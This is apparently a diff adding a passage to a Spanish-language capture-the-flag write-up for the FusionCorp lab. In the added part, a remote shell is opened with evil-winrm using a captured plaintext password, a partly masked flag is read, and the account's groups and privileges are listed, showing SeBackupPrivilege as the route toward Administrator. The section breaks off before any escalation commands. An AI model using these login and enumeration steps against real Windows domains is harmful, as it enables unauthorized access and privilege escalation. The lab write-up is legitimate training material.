@@ -319,6 +319,60 @@ Ya tenemos los puertos copiado en el Clipboard, un script simple pero de gran ay
 
 
 #### Usuario jmurphy --> Administrator
+
+-Obtenemos flag User2 y acceso a la maquina con el usuario jmurphy 
+
+    ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/FusionCorp]
+    └─# evil-winrm -i fusion.corp -u jmurphy -p 'u8WC3!kLsgw=#bRY'
+                                            
+    Evil-WinRM shell v3.5                                    
+    Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                          
+    Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                            
+    Info: Establishing connection to remote endpoint
+    *Evil-WinRM* PS C:\Users\jmurphy\Documents> type ..\Desktop\flag.txt
+    THM{b4aee2db29--------------42e047612e}
+
+-Listamos todo del usuario jmurphy y verificamos que pertenece al grupo Backup Operators con  permisos SeBackupPrivilege y SeRestorePrivilege.
+
+    *Evil-WinRM* PS C:\Users\jmurphy\Documents> whoami /all
+    
+    USER INFORMATION
+    ----------------
+    User Name      SID
+    ============== =============================================
+    fusion\jmurphy S-1-5-21-1898838421-3672757654-990739655-1104
+    
+    GROUP INFORMATION
+    -----------------
+    Group Name                                 Type             SID          Attributes
+    ========================================== ================ ============ ==================================================
+    Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+    BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
+    BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
+    BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+    BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
+    NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
+    NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+    NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+    NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+    Mandatory Label\High Mandatory Level       Label            S-1-16-12288
+    
+    PRIVILEGES INFORMATION
+    ----------------------
+    Privilege Name                Description                    State
+    ============================= ============================== =======
+    SeMachineAccountPrivilege     Add workstations to domain     Enabled
+    SeBackupPrivilege             Back up files and directories  Enabled
+    SeRestorePrivilege            Restore files and directories  Enabled
+    SeShutdownPrivilege           Shut down the system           Enabled
+    SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+    SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+-
+
+
+  
      
 
 
